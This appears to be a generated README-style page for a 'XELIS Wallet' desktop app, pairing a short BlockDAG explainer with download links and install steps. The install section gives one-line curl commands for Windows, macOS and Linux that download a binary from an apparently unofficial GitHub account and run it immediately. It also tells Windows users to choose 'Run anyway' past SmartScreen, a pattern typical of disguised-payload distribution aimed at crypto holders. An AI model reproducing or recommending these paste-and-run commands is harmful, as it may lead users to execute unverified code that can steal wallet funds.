![XELIS BlockDAG block time explained for XELIS Wallet users](assets/banner-article.png)
# XELIS BlockDAG block time explained for XELIS Wallet users

Parallel blocks, what they change about confirmations, and what stays unknown.

## Downloads - BlockDAG

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> A DAG changes how blocks relate, not whether a payment is final.

A BlockDAG lets a block reference more than one parent, so blocks produced in parallel are incorporated instead of discarded. For a wallet user the consequence is about confirmations: activity settles across parallel blocks rather than a single line of them.

<!-- ARTICLE-BODY-BEGIN -->
## What a BlockDAG is

In a linear chain each block has one parent, so two miners who solve a block at the same moment produce a race that one of them loses. A BlockDAG allows a block to reference several previous blocks, which means parallel work is recorded rather than thrown away.

XELIS is a proof-of-work network built this way, and mining is what produces the blocks. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-what-is-xelis-chain.md">What XELIS is</a> puts the DAG in the context of the rest of the network.

## Why parallel blocks are not orphans

An orphan is a valid block that the network discards because another block won the race. When several parents can be referenced, a block produced alongside another is still part of the structure, so the work behind it is not wasted.

The practical consequence is a ledger that records parallel work rather than a single-file queue.

## What confirmations mean in the wallet

The <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> reports a transaction as pending until the network includes it, then as confirmed. With parallel block production, confirmation is a statement about inclusion in the recorded structure, not about a specific position in a line of blocks.

That is why a pending transaction is worth diagnosing rather than panicking over; <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md">XELIS Wallet pending transaction</a> separates a queued payment from one that never left the app.

Block production itself is the other half of the picture, and <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-xelishash-cpu-mining.md">XELIS mining algorithm</a> explains how the hashing work fits the structure described here.

## The number this article does not print

Published sources disagree about the exact block time, so no figure appears here. A wrong number would be repeated, quoted and used to justify expectations the network does not owe anyone, and the honest answer is to check the network's own documentation or the current release notes.

The same caution applies to throughput. A DAG is often described as faster than a linear chain, and that description skips the conditions. What a wallet user can rely on is the state the wallet reports, not a headline rate.

## FAQ
### How fast is XELIS and what is a BlockDAG?
A BlockDAG is a block structure where a block can reference several parents, so parallel blocks are kept. Speed claims depend on conditions, so this article makes none.

### What is the XELIS block time?
Published sources disagree, so this article does not state a figure. Check the network's own documentation or the current release notes.

### Does a BlockDAG make payments instant?
No. It changes how blocks are recorded, not whether a transaction is included; the wallet still reports pending until inclusion.

### Do I need to understand this to use the wallet?
No. It explains why confirmations look the way they do, nothing about the daily steps of sending and receiving.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [What XELIS is](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-what-is-xelis-chain.md)
- [XELIS mining algorithm](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-xelishash-cpu-mining.md)
- [XELIS Wallet pending transactions](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md)
- [XELIS Wallet mining payouts](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-mining-payouts.md)
